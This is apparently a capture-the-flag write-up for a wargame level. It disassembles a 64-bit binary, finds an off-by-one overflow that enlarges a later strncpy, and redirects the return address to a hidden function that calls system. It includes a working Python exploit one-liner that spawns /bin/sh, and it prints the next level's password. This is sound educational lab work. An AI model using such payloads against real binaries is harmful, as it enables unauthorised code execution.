# BUFFER OVERFLOW BY 1 BYTE, LEADING TO ANOTHER BUFFER OVERFLOW

## Reverse engineering

### `main` function

```shell
(gdb) b main
Breakpoint 1 at 0xaac
(gdb) run
Breakpoint 1, 0x0000555555554aac in main ()
(gdb) ni
(gdb) ni
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
```
```asm
0000000000000aa8 <main>:
 aa8:	55                   	push   rbp
 aa9:	48 89 e5             	mov    rbp,rsp
 aac:	48 8d 3d 5d 01 00 00 	lea    rdi,[rip+0x15d]        # c10 <_IO_stdin_used+0x58>
 ab3:	e8 78 fc ff ff       	call   730 <puts@plt>
 ab8:	e8 03 fe ff ff       	call   8c0 <handle_msg>
 abd:	b8 00 00 00 00       	mov    eax,0x0
 ac2:	5d                   	pop    rbp
 ac3:	c3                   	ret    
```
- This binary is a 64-bit executable, meaning that addresses are 64 bits long
- The main function prints a welcome message and then calls the `handle_msg`

### `set_username` function

```shell


```asm
00000000000008c0 <handle_msg>:
 8c0:	55                   	push   rbp
 8c1:	48 89 e5             	mov    rbp,rsp
 8c4:	48 81 ec c0 00 00 00 	sub    rsp,0xc0
 8cb:	48 8d 85 40 ff ff ff 	lea    rax,[rbp-0xc0]
 ...
 906:	48 8d 85 40 ff ff ff 	lea    rax,[rbp-0xc0]
 ...
 915:	48 8d 85 40 ff ff ff 	lea    rax,[rbp-0xc0]
```
- Allocates 0xc0 (192) bytes of stack space for local variables

```asm
 8cb:	48 8d 85 40 ff ff ff 	lea    rax,[rbp-0xc0]
 8d2:	48 05 8c 00 00 00    	add    rax,0x8c
 8d8:	48 c7 00 00 00 00 00 	mov    QWORD PTR [rax],0x0
 8df:	48 c7 40 08 00 00 00 	mov    QWORD PTR [rax+0x8],0x0
 8e6:	00 
 8e7:	48 c7 40 10 00 00 00 	mov    QWORD PTR [rax+0x10],0x0
 8ee:	00 
 8ef:	48 c7 40 18 00 00 00 	mov    QWORD PTR [rax+0x18],0x0
 8f6:	00 
 8f7:	48 c7 40 20 00 00 00 	mov    QWORD PTR [rax+0x20],0x0
 8fe:	00 
 8ff:	c7 45 f4 8c 00 00 00 	mov    DWORD PTR [rbp-0xc],0x8c
```
- From rpb-0xc0 + 0x8c (moving the ptr on a struct member, [rpb-0xc0 + 0x8c] here) to +40 (5 x QWORD) bytes (to 0x), its initialized to 0
- Next to it, at rbp-0xc, a DWORD (4 bytes) is initialized to 0x8c (140 decimal)

```asm
 906:	48 8d 85 40 ff ff ff 	lea    rax,[rbp-0xc0]
 90d:	48 89 c7             	mov    rdi,rax
 910:	e8 b8 00 00 00       	call   9cd <set_username>
```
- Calls `set_username` with address of the structure (rbp-0xc0)

```asm
 915:	48 8d 85 40 ff ff ff 	lea    rax,[rbp-0xc0]
 91c:	48 89 c7             	mov    rdi,rax
 91f:	e8 0e 00 00 00       	call   932 <set_msg>
 924:	48 8d 3d 95 02 00 00 	lea    rdi,[rip+0x295]        # bc0 <_IO_stdin_used+0x8>
 92b:	e8 00 fe ff ff       	call   730 <puts@plt>
 930:	c9                   	leave  
 931:	c3                   	ret    
```
- Then `set_msg` is called with the same structure address
- The vulnerability is in `set_username` or `set_msg`

### `set_username` function

```asm
00000000000009cd <set_username>:
 9cd:	55                   	push   rbp
 9ce:	48 89 e5             	mov    rbp,rsp
 9d1:	48 81 ec a0 00 00 00 	sub    rsp,0xa0
 9d8:	48 89 bd 68 ff ff ff 	mov    QWORD PTR [rbp-0x98],rdi
 9df:	48 8d 85 70 ff ff ff 	lea    rax,[rbp-0x90]
 9e6:	48 89 c6             	mov    rsi,rax
 9e9:	b8 00 00 00 00       	mov    eax,0x0
 9ee:	ba 10 00 00 00       	mov    edx,0x10
 9f3:	48 89 f7             	mov    rdi,rsi
 9f6:	48 89 d1             	mov    rcx,rdx
 9f9:	f3 48 ab             	rep stos QWORD PTR es:[rdi],rax
```
- The buffer at rbp-0x90 is initialized to 0 for 128 bytes (0x90 - 0x10 = 0x80)

```asm
 9fc:	48 8d 3d e1 01 00 00 	lea    rdi,[rip+0x1e1]        # be4 <_IO_stdin_used+0x2c>
 a03:	e8 28 fd ff ff       	call   730 <puts@plt>
 a08:	48 8d 05 d0 01 00 00 	lea    rax,[rip+0x1d0]        # bdf <_IO_stdin_used+0x27>
 a0f:	48 89 c7             	mov    rdi,rax
 a12:	b8 00 00 00 00       	mov    eax,0x0
 a17:	e8 34 fd ff ff       	call   750 <printf@plt>
```
- Printf format string is not vulnerable because not user controlled

```asm
 a1c:	48 8b 05 95 15 20 00 	mov    rax,QWORD PTR [rip+0x201595]        # 201fb8 <_DYNAMIC+0x198>
 a23:	48 8b 00             	mov    rax,QWORD PTR [rax]
 a26:	48 89 c2             	mov    rdx,rax
 a29:	48 8d 85 70 ff ff ff 	lea    rax,[rbp-0x90]
 a30:	be 80 00 00 00       	mov    esi,0x80
 a35:	48 89 c7             	mov    rdi,rax
 a38:	e8 33 fd ff ff       	call   770 <fgets@plt>
```
- Fgets is called on stdin for 0x80 bytes and the input is stored at rbp-0x90 (the buffer initialized earlier)

```asm
 a3d:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
 a44:	eb 24                	jmp    a6a <set_username+0x9d>
 a46:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
 a49:	48 98                	cdqe   
 a4b:	0f b6 8c 05 70 ff ff 	movzx  ecx,BYTE PTR [rbp+rax*1-0x90]
 a52:	ff 
 a53:	48 8b 95 68 ff ff ff 	mov    rdx,QWORD PTR [rbp-0x98]
 a5a:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
 a5d:	48 98                	cdqe   
 a5f:	88 8c 02 8c 00 00 00 	mov    BYTE PTR [rdx+rax*1+0x8c],cl
 a66:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
 a6a:	83 7d fc 28          	cmp    DWORD PTR [rbp-0x4],0x28
 a6e:	7f 11                	jg     a81 <set_username+0xb4>
 a70:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
 a73:	48 98                	cdqe   
 a75:	0f b6 84 05 70 ff ff 	movzx  eax,BYTE PTR [rbp+rax*1-0x90]
 a7c:	ff 
 a7d:	84 c0                	test   al,al
 a7f:	75 c5                	jne    a46 <set_username+0x79>
 a81:	48 8b 85 68 ff ff ff 	mov    rax,QWORD PTR [rbp-0x98]
 a88:	48 8d 90 8c 00 00 00 	lea    rdx,[rax+0x8c]
```
- A loop is used to copy from the buffer of `set_username` to the 0x8c-offset-member of `handle_msg` struct (rbp-0xc0)
- This copy is limited to 0x29 bytes (41 decimal, 0->40 included) and stops at the first '\0: we can overwrite 1 byte (41-40) on the [rbp-0xc] member

```asm
 a8f:	48 8d 05 65 01 00 00 	lea    rax,[rip+0x165]        # bfb <_IO_stdin_used+0x43>
 a96:	48 89 d6             	mov    rsi,rdx
 a99:	48 89 c7             	mov    rdi,rax
 a9c:	b8 00 00 00 00       	mov    eax,0x0
 aa1:	e8 aa fc ff ff       	call   750 <printf@plt>
 aa6:	c9                   	leave  
 aa7:	c3                   	ret    
```
- Printf context strings

### `set_msg` function

```asm
0000000000000932 <set_msg>:
 932:	55                   	push   rbp
 933:	48 89 e5             	mov    rbp,rsp
 936:	48 81 ec 10 04 00 00 	sub    rsp,0x410
 93d:	48 89 bd f8 fb ff ff 	mov    QWORD PTR [rbp-0x408],rdi
 944:	48 8d 85 00 fc ff ff 	lea    rax,[rbp-0x400]
 94b:	48 89 c6             	mov    rsi,rax
 94e:	b8 00 00 00 00       	mov    eax,0x0
 953:	ba 80 00 00 00       	mov    edx,0x80
 958:	48 89 f7             	mov    rdi,rsi
 95b:	48 89 d1             	mov    rcx,rdx
 95e:	f3 48 ab             	rep stos QWORD PTR es:[rdi],rax
 961:	48 8d 3d 65 02 00 00 	lea    rdi,[rip+0x265]        # bcd <_IO_stdin_used+0x15>
 968:	e8 c3 fd ff ff       	call   730 <puts@plt>
 96d:	48 8d 05 6b 02 00 00 	lea    rax,[rip+0x26b]        # bdf <_IO_stdin_used+0x27>
 974:	48 89 c7             	mov    rdi,rax
 977:	b8 00 00 00 00       	mov    eax,0x0
 97c:	e8 cf fd ff ff       	call   750 <printf@plt>
 981:	48 8b 05 30 16 20 00 	mov    rax,QWORD PTR [rip+0x201630]        # 201fb8 <_DYNAMIC+0x198>
 988:	48 8b 00             	mov    rax,QWORD PTR [rax]
 98b:	48 89 c2             	mov    rdx,rax
 98e:	48 8d 85 00 fc ff ff 	lea    rax,[rbp-0x400]
 995:	be 00 04 00 00       	mov    esi,0x400
 99a:	48 89 c7             	mov    rdi,rax
 99d:	e8 ce fd ff ff       	call   770 <fgets@plt>
 9a2:	48 8b 85 f8 fb ff ff 	mov    rax,QWORD PTR [rbp-0x408]
 9a9:	8b 80 b4 00 00 00    	mov    eax,DWORD PTR [rax+0xb4]
 9af:	48 63 d0             	movsxd rdx,eax
 9b2:	48 8d 8d 00 fc ff ff 	lea    rcx,[rbp-0x400]
 9b9:	48 8b 85 f8 fb ff ff 	mov    rax,QWORD PTR [rbp-0x408]
 9c0:	48 89 ce             	mov    rsi,rcx
 9c3:	48 89 c7             	mov    rdi,rax
 9c6:	e8 55 fd ff ff       	call   720 <strncpy@plt>
 9cb:	c9                   	leave  
 9cc:	c3                   	ret    
``` 
- It is using the [rbp-0xc] member of the [rbp-0xc0] struct to limit the number of bytes copied from the buffer to the [rbp-0x400] buffer

## Exploitation

- The exploit is to overwrite a '0xff' bytes on the [rbp-0xc] member of the struct, to write further than 0x400 bytes into the [rbp-0x400] buffer
- We could be able to overwrite the return address to another address, but what address ?

```shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   /home/users/level09/level09
```
- The binary is pretty well-protected, we can't overwrite the GOT or to execute a shellcode on the stack or from the env variables

```asm
000000000000088c <secret_backdoor>:
 88c:	55                   	push   rbp
 88d:	48 89 e5             	mov    rbp,rsp
 890:	48 83 c4 80          	add    rsp,0xffffffffffffff80
 894:	48 8b 05 1d 17 20 00 	mov    rax,QWORD PTR [rip+0x20171d]        # 201fb8 <_DYNAMIC+0x198>
 89b:	48 8b 00             	mov    rax,QWORD PTR [rax]
 89e:	48 89 c2             	mov    rdx,rax
 8a1:	48 8d 45 80          	lea    rax,[rbp-0x80]
 8a5:	be 80 00 00 00       	mov    esi,0x80
 8aa:	48 89 c7             	mov    rdi,rax
 8ad:	e8 be fe ff ff       	call   770 <fgets@plt>
 8b2:	48 8d 45 80          	lea    rax,[rbp-0x80]
 8b6:	48 89 c7             	mov    rdi,rax
 8b9:	e8 82 fe ff ff       	call   740 <system@plt>
 8be:	c9                   	leave  
 8bf:	c3                   	ret    
```
- We found the solution: a function that calls `system` with a user-controlled input
- This is the address we want to overwrite at the return address of `set_msg` function

### Building the exploit

```shell
(gdb) b main
(gdb) run
(gdb) lay n
...
0x55555555488c <secret_backdoor>        push   %rbp                     
...
```
- The address of secret_backdoor is `0x55555555488c`

```
40 bytes of offset +
1 '0xff' byte to increase the limit of copied bytes + "\n" +
X number of bytes to offset until the return address location + 
'\x8c\x48\x55\x55\x55\x55\x00\x00' (the address of `secret_backdoor`) + "\n" +
'/bin/sh' (input for the system call)
```
- The struture of our exploit

### Find the offset of the return address

```shell
run < <(python -c "print '\x90' * 40 + '\xff\n' + 201 * 'A'")
Starting program: /home/users/level09/level09 < <(python -c "print '\x90' * 40 + '\xff\n' + 201 * 'A'")
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
>>: >: Msg sent!

Program received signal SIGSEGV, Segmentation fault.
0x0000000000000a41 in ?? ()
```
- The 0x41 at the end of the address, causing the segfault, is the 'A' character we used to overwrite the return address
- The offset is 200 !

### The exploit

```shell
~$ (python -c "print '\x90' * 40 + '\xff\n' + '\x90' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n/bin/sh'"; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
>>: >: Msg sent!
ls -la /home/users/end
...
-rw-r--r--+ 1 end  end     41 Oct 19  2016 .pass
...
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

```shell
~$ su end
Password: 

end@OverRide:~$ cat end
GG !
```